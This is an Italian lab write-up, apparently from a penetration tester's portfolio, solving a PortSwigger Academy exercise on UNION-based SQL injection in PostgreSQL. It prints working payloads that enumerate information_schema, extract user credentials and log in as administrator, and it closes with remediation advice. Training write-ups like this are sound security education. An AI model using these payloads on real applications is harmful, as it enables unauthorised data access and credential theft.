# SQL injection — Enumerazione del contenuto del database (PostgreSQL)

> **Autore:** Leonardo Onori — Junior Penetration Tester
> **Fonte:** PortSwigger Web Security Academy — *Listing the database contents on non-Oracle databases*
> **Target:** `0a0000eb03d7fa6e81e89833005d0088.web-security-academy.net`
> **Categoria:** OWASP A03:2021 – Injection · CWE-89
> **Severità:** Critical

---

## 1. Sintesi

Il filtro per categoria è vulnerabile a **SQL injection UNION-based** su backend **PostgreSQL**. Attraverso l'`information_schema` è stato enumerato lo schema del database fino a individuare la tabella delle utenze ed estrarre le credenziali dell'amministratore, ottenendo l'accesso all'account privilegiato.

| | |
|---|---|
| **Parametro vulnerabile** | `category` (GET `/filter`) |
| **DBMS** | PostgreSQL |
| **Colonne** | 2 (entrambe testo) |
| **Tabella utenti** | `users_prjibl` |
| **Colonne credenziali** | `username_btpaym`, `password_tttlqq` |

---

## 2. Metodologia — la catena di enumerazione

Lo schema seguito è lo standard per qualsiasi SQLi UNION-based su database **non-Oracle** (MySQL, PostgreSQL, SQL Server), che espongono i metadati tramite `information_schema`.

### 2.1 Elenco delle tabelle

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables-- -
```

Tra le numerose tabelle di sistema PostgreSQL (`pg_*`, `information_schema`) emerge la tabella applicativa con suffisso casuale:

```
users_prjibl
```

### 2.2 Elenco delle colonne della tabella utenti

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns
  WHERE table_name = 'users_prjibl'-- -
```

Risultato:

```
username_btpaym
password_tttlqq
email
```

### 2.3 Estrazione delle credenziali

```sql
' UNION SELECT username_btpaym, password_tttlqq FROM users_prjibl-- -
```

| Username | Password |
|---|---|
| **administrator** | `tt19lxhcfth8u4v5ucs3` |
| wiener | `3y0kmkmghqedtmq3oekz` |
| carlos | `u3ozcof22zp1kdtjiq6l` |

## 3. Payload finale

```
GET /filter?category=Pets' UNION SELECT username_btpaym,password_tttlqq FROM users_prjibl-- -
```

## 4. Post-exploitation

Login su `/my-account` come **administrator** con la password estratta → accesso all'account privilegiato.

## 5. Impatto

Compromissione completa della riservatezza del database: l'attaccante, **non autenticato**, ottiene tutte le credenziali applicative, incluse quelle amministrative. Le password in chiaro aggravano l'impatto (nessun hashing). Da qui è possibile il takeover dell'applicazione e il potenziale riuso delle credenziali su altri servizi (credential stuffing).

## 6. Remediation

- **Query parametrizzate** su ogni accesso al database.
- **Hashing robusto delle password** (bcrypt/argon2) con salt — mai storage in chiaro.
- **Privilegio minimo** per l'utenza DB applicativa (nessun accesso a `information_schema` oltre il necessario).
- **WAF** come difesa in profondità, non come controllo primario.

## 7. Nota tecnica (per il portfolio)

`information_schema` è lo standard SQL di auto-descrizione del database: la stessa tecnica di enumerazione funziona su MySQL, PostgreSQL e SQL Server. **Oracle** fa eccezione (usa `all_tables` / `all_tab_columns`), da cui la dicitura "non-Oracle" del titolo.

## 8. Riferimenti

- OWASP Top 10 — A03:2021 Injection
- CWE-89 — SQL Injection
- PortSwigger Web Security Academy — *Listing the database contents on non-Oracle databases*
